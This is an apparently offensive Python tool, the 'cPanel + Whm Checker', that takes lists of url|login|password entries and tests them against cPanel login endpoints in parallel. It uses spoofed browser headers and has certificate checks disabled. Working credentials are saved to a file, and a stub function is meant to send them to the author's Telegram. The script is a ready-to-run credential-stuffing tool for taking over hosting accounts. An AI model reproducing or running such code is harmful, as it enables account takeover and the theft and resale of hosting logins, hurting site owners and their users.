import sys
import requests
import re
from multiprocessing.dummy import Pool
from colorama import Fore, Style, init

init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def sendtext(text):
    try:
        # Ubah ke sesuai dengan pengiriman pesan Telegram Anda
        print(fg + "Sending Message" + fg)
    except:
        pass

print(fg + "cPanel + Whm Checker - RODY1337")

def check(txt):
    url = txt.split('|')[0]
    login = txt.split('|')[1]
    password = txt.split('|')[2]
    headers = {
      'Accept': '*/*',
      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
      'Connection': 'keep-alive',
      'Origin': url,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'}
    params = {'login_only': '1'}
    data = {'user': login, 'pass': password}
    try:
        try:
            response = requests.post(f'{url}/login/', params=params, headers=headers, data=data, timeout=20, verify=False).json()
            if response['status'] == 1:
                print(f'Valid: URL: {url} | Login: {login} | Password: {password}')
                with open('good.txt', 'a') as f:
                    f.write(f'{url}|{login}|{password}\n')
                    print(f"{url} --> [Success] {fg}")
                    sendtext(f"{url}|{login}|{password}")
            else:
                print(f'Invalid: URL: {url} | Login: {login} | Password: {password}')
                print(f"{url} --> [Failed] {fr}")
        except:
            print(f"{url} --> [Failed] {fr}")

    except requests.Timeout as err:
        try:
            print(f"{url} --> [Failed] {fr}")
        finally:
            err = None
            del err


def main(file, thread):
    accounts_list = open(file, 'r').read().splitlines()
    mp = Pool(thread)
    mp.map(check, accounts_list)
    mp.close()
    mp.join()

if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]))